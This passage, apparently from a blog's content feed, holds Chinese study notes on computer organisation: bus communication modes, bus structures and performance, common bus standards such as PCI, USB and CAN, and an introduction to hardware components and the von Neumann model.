title="异步通信"></a>异步通信</h4><blockquote><p>采用应答方式，没有公共的时钟标准</p></blockquote><p>异步通信是指参与通信的两个部件需要“感知”对方的操作，这个“感知”是通过“握手”信号实现的。</p><p>异步通信主要应用于：</p><ol><li>工作速率不同的部件之间相互通信</li><li>通信线路受到干扰的场合</li></ol><p>异步通信的“握手”协议分为：</p><ol><li>单边控制 通信过程是由源部件<strong>或</strong>目的部件控制</li><li>双边控制 通信过程由<strong>源部件和目的部件共同控制</strong></li></ol><blockquote><p>异步通信既可以用于并行传送也可以用于串行传送</p></blockquote><p>异步串行通信的数据传输率可以用波特率和比特率来衡量</p><blockquote><p>波特率—单位时间内传送二进制数据的位数，单位：bps</p><p>比特率—单位时间内传送二进制有效数据的位数，单位：bps</p></blockquote><h4 id="半同步通信"><a href="#半同步通信" class="headerlink" title="半同步通信"></a>半同步通信</h4><blockquote><p>同步、异步结合</p></blockquote><p>同步 发送方用时钟前沿发信号 接收方用系统时间后沿判断识别</p><p>异步 允许不同速度的模块和谐工作</p><pre><code>     增加一条等待响应信号WAIT</code></pre><p><img src="/2024/03/14/半同步.png" alt="半同步" style="zoom:50%;"></p><p><img src="/2024/03/14/半同步1.png" alt="半同步" style="zoom:50%;"></p><blockquote><p>上述三种通信的共同点</p><p>一个总线传输周期（以输入数据为例）</p><p>主模块发地址 、命令      占用总线</p><p>从模块准备数据               不占用总线</p><p>从模块向主模块发数据   占用总线</p></blockquote><h4 id="分离式通信"><a href="#分离式通信" class="headerlink" title="分离式通信"></a>分离式通信</h4><blockquote><p>充分挖掘系统总线每瞬间的潜力\</p></blockquote><p>一个总线传输周期</p><script type="math/tex; mode=display">\begin{cases}子周期1 \space 主模块申请占用总线，使用完后即放弃总线的使用权\\子周期2 \space 从模块申请占用总线，将各种信息送至总线上\end{cases}</script><p>特点：</p><ol><li>各模块有权申请占用总线</li><li>采用同步方式通信，不等对方回答</li><li>各模块准备数据时，不占用总线</li><li>总线被占用时，无空闲</li></ol><blockquote><p>充分发挥的总线的有效占用</p></blockquote><h1 id="总线结构"><a href="#总线结构" class="headerlink" title="总线结构"></a>总线结构</h1><h2 id="单总线结构"><a href="#单总线结构" class="headerlink" title="单总线结构"></a>单总线结构</h2><p><img src="/2024/03/14/单总线.png" alt="单总线"></p><p>特点：</p><ol><li>控制简单、便于扩充、造价低</li><li>易形成系统的瓶颈</li></ol><p>缺陷：</p><ol><li>由于各部件只能分时使用总线，系统工作效率低</li><li>总线设备之间传输速率不匹配</li></ol><h2 id="多总线结构"><a href="#多总线结构" class="headerlink" title="多总线结构"></a>多总线结构</h2><blockquote><p>采用多种速率不同的总线，将工作速度相差较大的设备挂在不同的总线上，低速总线作为高速总线的一个设备工作。</p></blockquote><h3 id="双总线结构"><a href="#双总线结构" class="headerlink" title="双总线结构"></a>双总线结构</h3><p><img src="/2024/03/14/双总线.png" alt="双总线"></p><h3 id="三总线结构"><a href="#三总线结构" class="headerlink" title="三总线结构"></a>三总线结构</h3><p><img src="/2024/03/14/三总线.png" alt="三总线"></p><p>PCI总线就是一种三总线结构，由下图可知PCI总线通过PCI桥路与CPU总线相连。这种结构使CPU总线与PCI总线互相隔离，具有更高的灵活性，可以支持更多的高速运行设备，而且具有即插即用的特性。</p><p><img src="/2024/03/14/三总线1.png" alt="三总线1"></p><h3 id="四总线结构"><a href="#四总线结构" class="headerlink" title="四总线结构"></a>四总线结构</h3><blockquote><p>增加了一条与计算机系统紧密相连的高速总线。</p><p>高速设备自身很少依赖处理器，而且比扩展总线的设备更贴近处理器，对高性能的设备与处理器来说，效率有很大提高。</p></blockquote><p><img src="/2024/03/14/四总线.png" alt="四总线"></p><h2 id="总线结构对系统性能的影响"><a href="#总线结构对系统性能的影响" class="headerlink" title="总线结构对系统性能的影响"></a>总线结构对系统性能的影响</h2><p>系统中总线条数越多，系统并行性越好，工作效率越高，结构越复杂，造价越高。系统中总线条数越少，越强调分时使用总线，工作效率越受影响，结构越简单，成本越低。</p><h1 id="总线的性能指标"><a href="#总线的性能指标" class="headerlink" title="总线的性能指标"></a>总线的性能指标</h1><h2 id="位宽"><a href="#位宽" class="headerlink" title="位宽"></a>位宽</h2><p>总线一次同时传送的信息位数或所需的线数。即一次操作可以传输的数据位数。主要是指数据总线的数目。</p><script type="math/tex; mode=display">\begin{cases}S100为8位\\ISA为16位\\EISA为32位\\PCI-2可达64位\end{cases}</script><p>总线的位宽直接影响总线的传输率（吞吐量）。</p><h2 id="工作时钟频率"><a href="#工作时钟频率" class="headerlink" title="工作时钟频率"></a>工作时钟频率</h2><p>控制总线中的时钟信号线所提供的时钟频率。</p><h2 id="标准传输率（总线带宽）"><a href="#标准传输率（总线带宽）" class="headerlink" title="标准传输率（总线带宽）"></a>标准传输率（总线带宽）</h2><p>总线上每秒钟能传输的最大字节量。以MB/S表示</p><p>总线本身所能达到的最高传送速率</p><p><strong>总线带宽＝总线位宽×总线工作频率/8</strong></p><h2 id="负载能力"><a href="#负载能力" class="headerlink" title="负载能力"></a>负载能力</h2><p>总线上所能连接部件的最大个数</p><h2 id="总线复用"><a href="#总线复用" class="headerlink" title="总线复用"></a>总线复用</h2><p>物理线路是一组，功能上地址线 与 数据线 复用――分时复用。</p><h2 id="总线定时协议（握手机制）"><a href="#总线定时协议（握手机制）" class="headerlink" title="总线定时协议（握手机制）"></a>总线定时协议（握手机制）</h2><p>依据数据传输采用何种时钟控制，可分为同步、异步、半同步、分离式</p><h2 id="几种常见总线的性能"><a href="#几种常见总线的性能" class="headerlink" title="几种常见总线的性能"></a>几种常见总线的性能</h2><p><img src="/2024/03/14/总线性能.png" alt="总线性能"></p><h1 id="常用总线标准"><a href="#常用总线标准" class="headerlink" title="常用总线标准"></a>常用总线标准</h1><blockquote><p>总线标准：</p><p>为适应模块化设计，使各生产厂家的产品具有可组合性和可替换性，需要对总线进行规范，提出一种标准的信息传递通道。</p><p>总线标准分为两类：</p><p>一类是由国际权威机构制定的（ RS—232C  是美国电子工业协会（EIA）制定的） ，另一类是由某厂家设计而广泛流行的（PCI总线：Intel联合IBM，Compaq等100多家公司联合共同开发）</p></blockquote><h2 id="系统总线"><a href="#系统总线" class="headerlink" title="系统总线"></a>系统总线</h2><h3 id="S-100总线"><a href="#S-100总线" class="headerlink" title="S-100总线"></a>S-100总线</h3><p>S-100总线产生于1975年，第一个标准化总线，它有l00条信号线，是为8080微处理器设计的。</p><p>这种总线的主要缺点：</p><p>1）布线不合理，时钟信号线位于9条控制信号线之间，容易造成串扰；</p><p>2）只规定了两条地线，接地点太少，容易造成地线干扰；</p><p>3）对DMA传送虽然作了考虑，但对所需引脚并未明确定义；</p><p>4）将＋8V与－18V电源紧排在一起，又没有保护措施，一旦插入操作有误，使＋8V与－18V相碰，轻则损坏电压调整器，重则使接到＋5V上的所有集成电路报废。</p><p>没有总线仲裁机构，因此不适于多处理器系统。这种总线目前已很少有人使用。</p><h3 id="IBM-PC总线和ISA总线"><a href="#IBM-PC总线和ISA总线" class="headerlink" title="IBM PC总线和ISA总线"></a>IBM PC总线和ISA总线</h3><p>IBM PC总线是IBM PC/XT个人计算机采用的微型机总线。它是针对Intel 8088微处理器设计的，有62条信号线，以适应8088的8位数据线和20位地址线。      为了和Inte1 80286等高性能16位微处理器兼容，IBM公司在PC总线基础上增加了一个36引脚的AT扩展插座而形成AT总线。在IBMPC/AT及其兼容机的机箱中，通常在母板上分别设置几个AT插槽和PC插槽，这种结构也称之为IBM公司的ISA结构(即工业标准结构)。IBM PC/AT总线也称为ISA总线。      ISA是将微处理器芯片总线经缓冲直接映射到系统总线上，也是一种原始的总线设计。并且，ISA总线没有支持总线仲裁的硬件逻辑，所以不支持多主设备系统。       现在，ISA总线仍然被使用，特别是在工控机中。但在这种微机系统中，为了发挥32位微处理器的性能，往往把主板上的存储器直接连到CPU的芯片总线上，而ISA总线仅作为扩展I/O模块的总线。</p><h3 id="PC-104总线"><a href="#PC-104总线" class="headerlink" title="PC-104总线"></a>PC-104总线</h3><p>采用超小尺寸插卡；自叠总线结构；总线驱动电流小，功耗低。现在大量地用于工业控制系统中，在信号上与ISA总线兼容。</p><h3 id="Multibus-Ⅰ和Ⅱ"><a href="#Multibus-Ⅰ和Ⅱ" class="headerlink" title="Multibus Ⅰ和Ⅱ"></a>Multibus Ⅰ和Ⅱ</h3><p>Intel公司的Multibus总线是一种能支持多处理器并行运行的总线。这种总线实际存在多种总线概念，即包括系统总线、局部总线、和板上I/O扩展总线SBX、LBX。这也是多总线(Multibus)得名的由来。     MultibusⅠ支持8位、16位的微处理器，采用单功能模板概念，适用于工业控制。MultibusⅡ支持32位微处理器。 </p><h3 id="VME总线"><a href="#VME总线" class="headerlink" title="VME总线"></a>VME总线</h3><p>MOTOTOLA公司的VME总线（IEEE（美国电子电机工程师协会） 1014标准）也是一种支持多计算机/多处理器的系统总线。    支持16、32位微处理器，支持四个主CPU模板并行运行。 这种高性能总线是开放式总线结构，受到许多厂家，特别是欧洲以及那些与Motorola68000微处理器有关的用户欢迎。</p><h3 id="微通道MCA"><a href="#微通道MCA" class="headerlink" title="微通道MCA"></a>微通道MCA</h3><p>BM公司于1987年推出微通道总线(Micro Channel Architecture)，即MCA。它是带有 24位DMA的10MHz总线，提供16MB的寻址能力，32位数据总线。它配有总线仲裁机构，可支持16个总线主控器。    </p><p>优点：</p><p>它是一个经过很好定义的32位总线标准，有利于形成更好更可靠的产品。   </p><p> 缺点：</p><p>缺乏与已有硬件的兼容性，非开放式结构。微通道的研制成功，彻底改变了IBM公司于1981年为IBM PC扩展而建立的开放式硬件标准，回到了的老路。微通道与PC机的非兼容性为它自身的发展造成了困难。</p><h3 id="EISA总线-Extend-industry-Standard-Architecture"><a href="#EISA总线-Extend-industry-Standard-Architecture" class="headerlink" title="EISA总线(Extend  industry Standard  Architecture)"></a>EISA总线(Extend  industry Standard  Architecture)</h3><p>以Compaq为首联合起来推出的。     </p><p> EISA是ISA总线的扩展，它既保持了与老的IBM PC系列机兼容，又具有MCA的先进性，但不与MCA兼容。      </p><p><strong>该总线作为ISA总线完全兼容的扩展</strong>，支持多个总线主控器，并加强了DMA功能，增加了突发方式传输，是一种支持多处理机的高性能<strong>32位</strong>标准总线。</p><h3 id="采用总线复用技术的Q总线和NUBUS"><a href="#采用总线复用技术的Q总线和NUBUS" class="headerlink" title="采用总线复用技术的Q总线和NUBUS"></a>采用总线复用技术的Q总线和NUBUS</h3><p>Q总线：DEC公司的工业总线，它采用复用数据线和地址线的办法来支持16位和32位微型化的小型机。      </p><p>NUBUS：APPLE公司和TI公司提出的，则采用数据总线、地址总线和控制总线三条总线复用44条信号线，另加5条总线仲裁，可支持32位微处理器。APPLE和TI公司希望用这种总线取代微通道总线。 </p><h3 id="STD总线"><a href="#STD总线" class="headerlink" title="STD总线"></a>STD总线</h3><p>1987年，STD总线最初的设计目标是和所有8位微处理器相兼容，以小尺寸(4.5in×6.5in)、高可靠性、低价格的面貌出现，为嵌入式系统提供解决手段。通常人们把STD总线称为“兰领总线”，因为它把侧重点放在工业测控应用上。    16位微处理器出现后，为了仍旧能使用该总线，采用周期窃取和总线复用技术来扩充地址线和数据线，所以STD是8位/16位兼容的总线。为了能和32位微处理器80386、80486、68030等兼容，近年来又定义了STD32总线标准，且与原来8位总线的I/O模板兼容。 </p><h2 id="局部总线"><a href="#局部总线" class="headerlink" title="局部总线"></a>局部总线</h2><blockquote><p>局部总线是为解决高性能CPU与低性能的系统总线之间的瓶颈问题而提出的。出于对兼容性的考虑，还不能将ISA总线淘汰掉，所以需要一个变通办法来解决该瓶颈，办法之一就是采用局部总线。</p></blockquote><p>高性能CPU的芯片总线可以支持很高的数据传输率，因而可将某些模块直接挂接在芯片总线上，实际上许多主板上的存储器都是采用该方法。但对于多个模块，CPU的芯片总线驱动就能力不够了，因而需增加驱动电路，这样就形成了局部总线，它为CPU和高速的外设间提供了一条直接通路。</p><h3 id="VL-BUS"><a href="#VL-BUS" class="headerlink" title="VL-BUS"></a>VL-BUS</h3><p>VESA（视频电子标准协会）与60余家公司联合推出的局部总线；32bit总线，在标准的ISA插槽之后提供附加的第三和第四接口，额定频率33MHz，并且能够提供超过ISA的卓越性能。    </p><p>VL-BUS最主要的特点也是其没落的最主要原因。本来，它是作为486处理器/内存总线的直接扩展，运行在与处理器相同的频率上，因此名为“本地总线”。这种直接的扩展意味着如果连接的设备过多，则很可能会干扰处理器自身的工作，特别是当信号通过一个插槽时。VESA建议在33MHz的频率上只使用2个插槽，或者在总线使用电子缓冲时使用3个。在更高的频率上不能连接2个以上的设备，而在50MHz时它们则必须都内建于主板内。</p><h3 id="PCI总线"><a href="#PCI总线" class="headerlink" title="PCI总线*"></a>PCI总线*</h3><p>PCI总线是厂家自发制定的一种企业联盟标准总线，是专门为奔腾系列芯片而设计，可满足图形界面及高速传输率扩展卡的需求。Intel公司于1991年首先提出了PCI总线的概念。之后，Intel联合IBM，Compaq等100多家公司联合共同开发PCI总线，并于1993年推出了PCI总线标准。因局部总线PCI等非常流行和普及，现在大多数人认为局部总线PCI等就是系统总线。因此，局部总线和系统总线没有本质区别，现在统称为系统总线。   </p><p>PCI总线的特点:</p><ol><li>独立于处理器。工作频率与CPU时钟无关，可支持多机系统及未来的处理器。</li><li>传输效率高。支持64位数据总线，总线速度为66MHz，最大数据传输率达528MB/s。</li><li>多总线共存。PCI有良好的兼容性，可支持ISA，EISA，MCA，SCSI，IDE等多种总线，同时还预留了发展空间。</li><li>支持两种电压。PCI提供两种信号环境：5V和3.3V，并可进行两种环境的转换，扩大了的适应范围。</li><li>具有即插即用功能。PCI标准允许PCI局部总线扩展卡和元件进行自动配置，提供了即插即用的能力。 </li><li>合理的管脚安排。PCI总线采用数据线和地址线复用结构，减少了总线的引用脚数，从而可节省线路空间降低设计成本，目标设备可用47引脚，总线主控设备可用49引脚。</li><li>PCI对32位与64位总线的使用是透明的，它允许32位与64位器件相互协作。</li><li>支持突发传输，支持总线主控方式，采用同步操作。</li></ol><h2 id="设备总线"><a href="#设备总线" class="headerlink" title="设备总线"></a>设备总线</h2><blockquote><p>计算机与外部设备的信息交换称为通信，这里的设备可以是外部设备，也可以是计算机。设备总线，也称为通信总线，就是实现计算机或外部设备间互连的一类总线。按通信方式可分为并行总线和串行总线。</p></blockquote><h2 id="RS-232C"><a href="#RS-232C" class="headerlink" title="RS-232C"></a>RS-232C</h2><p>是美国电子工业协会（EIA）与BELL等公司一起开发的1969年颁布的数据通信协议。字母RS表示Recommanded  Standard（推荐标准），232是识别代码，C是标准的版本号。</p><p>RS232C总线的特点：</p><ol><li>可实现双工通信</li><li>具有多种传输速率，可适应不同速率的外设</li><li>采用串行传输方式，传输距离远 </li><li>采用负逻辑，抗干扰能力强</li></ol><h3 id="SCSI总线-small-computer-system-interface"><a href="#SCSI总线-small-computer-system-interface" class="headerlink" title="SCSI总线(small computer system interface)"></a>SCSI总线(small computer system interface)</h3><p> SCSI是小型计算机系统接口简称。SCSI接口是高速硬盘接口规范，采用8/16/32位并行总线，可用于硬盘、光盘、扫描仪、打印机、磁带机等多种外围设备的连接。</p><h3 id="ATA（AT-Attachment）"><a href="#ATA（AT-Attachment）" class="headerlink" title="ATA（AT Attachment）"></a>ATA（AT Attachment）</h3><p>又称<strong>IDE</strong>（Integrated Drive Electronics）。从1985年上市到1992年，它一直是纯硬盘驱动接口。为了与SCSI竞争，WD公司推出了增强型IDE标准EIDE，即ATA-2标准，ATA-2不仅可以连接硬盘，而且可以连接CD-ROM磁带机等存储设备，它允许接4台设备，支持大于528MB的硬盘容量。</p><h3 id="IEEE488"><a href="#IEEE488" class="headerlink" title="IEEE488"></a>IEEE488</h3><p>是HP公司在20世纪70年代为解决各种仪器仪表与各类计算机接口互不兼容的问题而研制的通用接口总线HP-IB。1975年IEEE委员会以IEEE488标准予以推荐。</p><p>IEEE488总线包括8条双向数据线，3条字节传送控制线和5条通用控制线，它可以将计算机，电压表，电源，频率发生器等装置通过一条488总线电缆连接起来。IEEE488系统以机架层叠式智能仪器为主要器件，可以以积木方式构成开放式系统。</p><h3 id="Centronics"><a href="#Centronics" class="headerlink" title="Centronics"></a>Centronics</h3><p>Centronics是一个打印机厂商的名字，也是一种较早推出的计算机与打印机和绘图仪进行连接的并行总线。该总线由36个信号线构成，采用扁平电缆或多芯电缆 进行8位数据传输，传输率为100KB/s，最大传送距离为2m。在用扁平电缆做传输线时，每两条传输线之间加一条地线，较好的克服了数据间的干扰。这种总线应用非常广泛，有多外设通过Centronics总线和计算机进行通信，例如：编程器、大容量软盘驱动器和刻录光驱等。</p><h3 id="USB-UNIVERSAL-SERIAL-BUS"><a href="#USB-UNIVERSAL-SERIAL-BUS" class="headerlink" title="USB(UNIVERSAL SERIAL BUS )  *"></a>USB(UNIVERSAL SERIAL BUS )  *</h3><p>USB总线是1994年以Intel为首包括Compad、HP、Lucent、Microsoft、NEC、Philips7家公司联合发布的新一代通用串行总线。1996年推出了标准版本USB1.0， 2000年又推出了标准版本USB2.0, 2008年发布了USB3.0标准，最大传输带宽高达625MB/s。USB有可能取代许多总线标准，成为微机与许多外设或系统进行连接的主要或唯一的途径。</p><p>USB的特点  ：</p><blockquote><p>USB是一种快速的、双向的、同步的、低成本的可动态加入的串行总线。它有许多优良的性能。</p></blockquote><ol><li><strong>提供热即插即用功能</strong>       连接外设不必打开机箱，也不必关闭主机电源，能够自我识别外设，能自动在驱动器与配置间进行功能映射；可动态地加入与重新配显外设。</li><li><strong>适用范围很宽</strong>       它适用于带宽从几Kb/s到几百Mb/s范围的设备，即可连接键盘、鼠标、摄像头、游戏设备、虚拟现实外设的低速设备，也可连接电话、声卡、麦克风、压缩视频这样的全速设备，还可以连接视频、存储器、图像这样的高速设备。</li><li><strong>总线利用率高</strong>       支持同一束电缆上的同步以及异步传输，支持多设备的并行操作，支持最多127个物理设备，支持主机与设备间的多数据和消息流传输；允许接入复合设备。因为协议的额外开销较低，所以总线利用率很高。</li><li><strong>传输灵活</strong>       它允许传送不同大小的包，并通过适配包的大小与等待时间来允许设备数据率有一定范围的变化；它在协议中建立了用于缓冲处理的流控制。</li><li><strong>机制强壮</strong>      它在协议中建立了错误处理/故障恢复机制；可在被用户察觉的时间内识别动态加入和退出的设备，并支持故障设备的识别。</li><li><strong>提供了低成本的实现方案</strong>       它对外设与主机硬件中的集成进行了优化；适应低成本外设的开发；提供低成本电缆和连接器使用商品技术；USB结构可以升级为在一个系统中支持多个USB主机控制器。</li><li><strong>生命力强</strong>       USB是一种开放性的不具有专利版权的工业标准，因此不存在版权问题，具有强大的生命力。</li></ol><p>USB总线支持以下三种数据速率传输：</p><p>USB高速(high-speed)信号传输位速率为480Mb/s；</p><p>USB全速(full—speed)信号传输位速率为12Mbs；</p><p>有限能力的低速(low-speed)信号传输模式位速率为1.5Mb/s。</p><h3 id="IEEE1394"><a href="#IEEE1394" class="headerlink" title="IEEE1394"></a>IEEE1394</h3><p>是IEEE在APPLE公司的高速串行总线Fire wire（火线）基础上制定的串行总线标准。    1394具有更多的外设支持能力，尤其在影视多媒体方面有优异的支持能力；使用存储器映射地址总线；有真正的即插即用和热插拔能力；提供更长的电缆（设备间4.5m，总线末端间为72m）和更高的速率（数据传输率为50Mb/s、100Mb/s、400Mb/s）。1394十分容易配置，它采用6线连接，树状结构，最多可接63个设备。在存储设备接口中，IEEE1394被认为将有可能取代SCSI及ATA接口。1997年Seagate及Maxtor分别于Comdex’97中展示了1394接口硬盘驱动器的雏形机种，1995年10月，Sony在可摄式录象机上首先将1394接口列为标准。    总之，IEEE1394是一种高速外设总线，就是面对高速外设 的。</p><h3 id="CAN总线"><a href="#CAN总线" class="headerlink" title="CAN总线"></a>CAN总线</h3><p>1986年2月，在SAE（汽车工程人员协会）大会上，Rober Bosch公司提出CAN。这个由Bosch公司设计的新的总线系统．称之为“Automotive Serial Controller Area Network”（汽车串行控制局域网）    1987年， Intel公司推出第一片CAN控制芯片——82526。它是CAN协议的第一个在硬件上的实现。 </p><p>特点：</p><ol><li>CAN是到目前为止唯一有国际标准的现场总线。</li><li>CAN为多主方式工作，网络上任一节点均可在任意时刻主动地向网络上其他节点发送信息，而不分主从。</li><li>在报文标识符上，CAN 上的节点分成不同的优先级，可满足不同的实时要求，优先级高的数据最多可在134μs内得到传输。</li><li>CAN采用非破坏总线仲裁技术。当多个节点同时向总线发迭信息出现冲突时，优先级较低的节点会主动地退出发送，而最高优先级的节点可不受影响地继续传输数据， CAN节点只需通过对报文的标识符滤波即可实现点对点、一点对多点及全局广播等几种方式传送接收数据。</li><li>CAN的直接通信距离最远可达 11 km；通信速率最高可达1Mbps。</li><li>CAN 上的节点数主要取决于总线驱动电路，目前可达 110个。</li><li>CAN的通信介质可为双绞线、同轴电缆或光纤，选择灵活。</li><li>CAN节点在错误严重的情况下具有自动关闭输出功能，以使总线上其他节点的操作不受影响．</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【计算机组成原理】概论</title>
      <link href="/2024/03/12/"/>
      <url>/2024/03/12/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机系统简介"><a href="#计算机系统简介" class="headerlink" title="计算机系统简介"></a>计算机系统简介</h1><blockquote><p>分为软件和硬件</p></blockquote><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>软件指：由具有各类特殊功能的信息(程序)组成</p><p>软件又分为系统软件和应用软件</p><p>系统软件用来管理整个计算机系统</p><p>应用软件是按任务需要编制的各种程序</p><h2 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h2><p>硬件指：构成计算机的实体，如主机，外设</p><p>主板集成了处理器存储器输入输出控制器以及印刷线</p><script type="math/tex; mode=display">电子计算机\begin{cases}控制单元(CU)\\运算单元(ALU)\\存储器\\输入单元\\输出单元\\\end{cases}</script><p>计算机硬件系统基本组成</p><p><img src="/2024/03/12/硬件系统基本组成.png" alt="硬件系统基本组成"></p><h3 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h3><p>主板上的存储器<strong>可以被处理器直接访问</strong>，称为<strong>主存(Main Memory)</strong>，其特点是在断电后，主存信息会消失，“易失性存储器（Volatile Memory）”</p><p>其他硬件包括软盘驱动器，硬盘驱动器，光盘驱动器，以及联系它们的线缆</p><p>该机箱以及其中硬件统称<strong>主机</strong></p><blockquote><p>不包含输入/输出设备</p></blockquote><p><strong>辅助存储器(Secondary Memory,简称为辅存)</strong>，断电后这里数据不会消失，“非易失的存储器（Non-Volatile Memory）”</p><p>常见辅存有：</p><p>硬盘（Hard Disk ，HD）</p><p>软盘（Floppy Disk，FD）</p><p>光盘（Optical Disk Memory ODM）</p><p>磁带等</p><blockquote><p>处理器只与速度较快的主存交换信息，不直接访问辅存（确保工作效率）</p><p>辅存信息要装入主存才能给处理器使用</p></blockquote><h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><p>通常将<strong>CU</strong>和<strong>ALU</strong>集成在一起，构成<strong>处理单元(Processing Unit,PU)</strong>,也叫处理器(Processor)</p><p>一台计算机通常只拥有一个PU，而它又是核心部件，故称为<strong>中央处理器（Central Processing Unit,CPU）</strong></p><p>一台计算机可以有多个PU，这样的叫做并行计算机（Parallel Computer）或高性能计算机（High Performance Computer）</p><p>PU的组成</p><script type="math/tex; mode=display">PU\begin{cases}控制单元CU \space CU是PU的指挥机构\begin{cases}1.程序计数器PC\\2.存放当前指令的指令寄存器IR\\3.解释指令的指令译码器ID\\4.发出各种命令信号的控制信号发生器CSG\\等\end{cases}\\算术逻辑单元ALU\begin{cases}1.加法器\\2.逻辑运算器\\3.移位器(Shifter)\\4.求补器(Complementer)\end{cases}\\寄存器 \space暂存单元\begin{cases}存放访存地址的寄存器MAR(Memory Access Register)\\存放与主存交换数据的寄存器MDR(Memory Data Register)(MBR)\\\end{cases}\\\end{cases}</script><p>在一个访存周期内</p><p>主存地址送入MAR $\Longrightarrow$启动读命令$\Longrightarrow$数据从主存写入MDR</p><p>或者</p><p>主存地址送入MAR且目标数据送入MDR $\Longrightarrow$启动写命令$\Longrightarrow$数据从MDR写入主存</p><h3 id="主板"><a href="#主板" class="headerlink" title="主板"></a>主板</h3><script type="math/tex; mode=display">主板(MotherBoard)\begin{cases}CPU插座\\CPU调压器\\主板芯片组\\存储器插座\\总线插槽\\两块特殊的集成电路芯片    \begin{cases}    CMOS\\    BIOS\\    \end{cases}\end{cases}</script><h4 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h4><blockquote><p>Basic Input-Output System</p><p><strong>程序为主</strong></p></blockquote><p>主板上的一个ROM芯片</p><p>存放了微机系统的基本输入输出程序、系统信息设置程序、开机上电自检程序、系统启动自举程序等</p><h4 id="CMOS"><a href="#CMOS" class="headerlink" title="CMOS"></a>CMOS</h4><blockquote><p>数据为主</p></blockquote><p>主板上的一个可读写的RAM芯片</p><p>存放了当前系统硬件配置、操作人员对某些参数的设定</p><h4 id="BIOS和CMOS的关系"><a href="#BIOS和CMOS的关系" class="headerlink" title="BIOS和CMOS的关系"></a>BIOS和CMOS的关系</h4><p>BIOS中的系统设置程序是完成CMOS参数设置的手段</p><p>CMOS RAM既是BIOS设定系统参数的存放场所，又是BIOS设定系统参数的结果</p><h2 id="计算机的解题过程"><a href="#计算机的解题过程" class="headerlink" title="计算机的解题过程"></a>计算机的解题过程</h2><p><img src="/2024/03/12/计算机的解题过程.png" alt="计算机的解题过程"></p><h1 id="计算机系统的层次结构"><a href="#计算机系统的层次结构" class="headerlink" title="计算机系统的层次结构"></a>计算机系统的层次结构</h1><p><img src="/2024/03/12/层次结构.png" alt="层次结构" style="zoom:50%;"></p><p><img src="/2024/03/12/层次结构2.png" alt="层次结构2" style="zoom:50%;"></p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>用户使用计算机时看到的这些软件的界面</p><blockquote><p>这些软件的界面就是计算机所具有功能的具体体现</p></blockquote><p>虚拟机实现途径有两种：解释和翻译</p><p>解释是指在执行某一层机器的源程序时，其中的指令/语句是逐条地、实时替换成以下一层机器语言编写的等效程序段，然后在下一层机器上运行。</p><p>翻译是指某一层机器的源程序，在运行之前，先一次性地转换成以下一层机器语言编写的程序，然后在下一层机器上运行。</p><h1 id="计算机体系结构、组成与实现"><a href="#计算机体系结构、组成与实现" class="headerlink" title="计算机体系结构、组成与实现"></a>计算机体系结构、组成与实现</h1><h2 id="计算机体系结构"><a href="#计算机体系结构" class="headerlink" title="计算机体系结构"></a>计算机体系结构</h2><p>计算机体系结构是指程序员所看到的机器属性，即机器的概念性结构和功能表现</p><blockquote><p>同一家厂家生产的具有相同体系结构的计算机称为系列计算机（Family Computer）简称系列机</p></blockquote><p>软件兼容：同一个程序可以不加修改地在相同体系结构的各档机器上正确运行，唯一区别仅在于时间长短不同</p><blockquote><p>不同厂家生产的具有相同计算机体系结构的计算机称为兼容计算机，简称兼容机</p></blockquote><h2 id="计算机组成与计算机实现"><a href="#计算机组成与计算机实现" class="headerlink" title="计算机组成与计算机实现"></a>计算机组成与计算机实现</h2><p>计算机组成是计算机体系结构的逻辑实现。一种计算机体系结构可以有多种不同的计算机组成</p><p>计算机实现是计算机组成的物理实现。一种计算机组成也可以有多种不同的计算机实现</p><h2 id="计算机体系结构、组成与实现的关系"><a href="#计算机体系结构、组成与实现的关系" class="headerlink" title="计算机体系结构、组成与实现的关系"></a>计算机体系结构、组成与实现的关系</h2><p>等价性原理：硬件和软件在逻辑功能上等价。即软件的功能在原理上可以由硬件或固件来实现；硬件的功能在原理上也可以由软件的模拟来实现</p><p>计算机体系结构的核心是<strong>指令集（Instruction Set）</strong>指令集就是软硬件功能划分的界面</p><h1 id="计算机的基本组成"><a href="#计算机的基本组成" class="headerlink" title="计算机的基本组成"></a>计算机的基本组成</h1><h2 id="冯·诺伊曼计算机模型"><a href="#冯·诺伊曼计算机模型" class="headerlink" title="冯·诺伊曼计算机模型"></a>冯·诺伊曼计算机模型</h2><blockquote><p>将计算机的用途和硬件完全分离。引入“程序”和“存储器”，采用“存储程序的控制方案”</p></blockquote><h3 id="存储程序思想（冯·诺伊曼思想）"><a href="#存储程序思想（冯·诺伊曼思想）" class="headerlink" title="存储程序思想（冯·诺伊曼思想）"></a>存储程序思想（冯·诺伊曼思想）</h3><pre><code>将指令和数据以同一形式（二进制）存入计算机的同一存储装置（存储器）中，使得计算机在工作时能自动（不需人工干预）、高速地从存储器中取出指令加以执行，并自动转入到下一条指令执行。</code></pre><h3 id="冯·诺依曼计算机的基本组成："><a href="#冯·诺依曼计算机的基本组成：" class="headerlink" title="冯·诺依曼计算机的基本组成："></a>冯·诺依曼计算机的基本组成：</h3><pre><code>  基本组成：运算器、存储器、输入单元 、输出单元、控制器**。**</code></pre><h3 id="冯·诺伊曼计算机硬件框图"><a href="#冯·诺伊曼计算机硬件框图" class="headerlink" title="冯·诺伊曼计算机硬件框图"></a>冯·诺伊曼计算机硬件框图</h3><p><img src="/2024/03/12/冯诺伊曼硬件框图.png" alt="冯诺伊曼硬件框图"></p><h3 id="基本特征"><a href="#基本特征" class="headerlink" 